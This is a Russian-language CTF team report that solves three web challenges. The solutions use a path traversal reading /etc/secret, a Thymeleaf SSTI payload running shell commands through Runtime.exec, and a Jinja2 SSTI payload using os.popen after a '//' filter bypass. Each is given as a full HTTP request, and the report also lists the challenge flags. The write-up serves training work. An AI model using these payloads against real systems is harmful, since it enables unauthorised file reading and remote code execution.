# Отчёт команды "The Vermillion Team" (No. 26)
## CTF 

### Web-10

В этом задании представлена обычная уязвимость **Path Traversal**. На бэкенде можно подгружать любые файлы.
```
GET /download?file_type=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fsecret HTTP/1.1
Host: 192.168.12.10:5001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://192.168.12.10:5001/
Upgrade-Insecure-Requests: 1
```

Флаг: `nto{P6t9_T77v6RsA1}`


### Web-20

В этом задании пейлоад работает через Spring View Manipulation + SSTI под thymeleaf. Соответственно:
```
GET /doc/__%24%7Bnew%20java.util.Scanner%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22cat%20password.txt%22%29.getInputStream%28%29%29.next%28%29%7D__%3A%3A.x. HTTP/1.1
Host: 192.168.12.13:8090
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
```

Отсюда получаем наш пароль и следующим запросом получаем флаг.
```
GET /login?password=33a61c66899af2114c8f98d80ceb2857 HTTP/1.1
Host: 192.168.12.13:8090
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
```

Флаг: `nto{abobovichasdfas}`

### Web-30

В этом задании есть фильтр, отсеивающий запросы, начинающиеся с `/flag`. Через // обходим данную проверку. Дальше код в любом случае выполнит наш код независимо от того, содержатся в нем запрещенные символы или нет.
```
GET //flag?name={%7b+self.__init__.__globals__.__builtins__.__import__('os').popen('cat+flag.txt').read()+}} HTTP/1.1
Host: 192.168.12.11:8001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
```

Флаг: `nto{Ht1P_sM088Lin6_88Ti}`
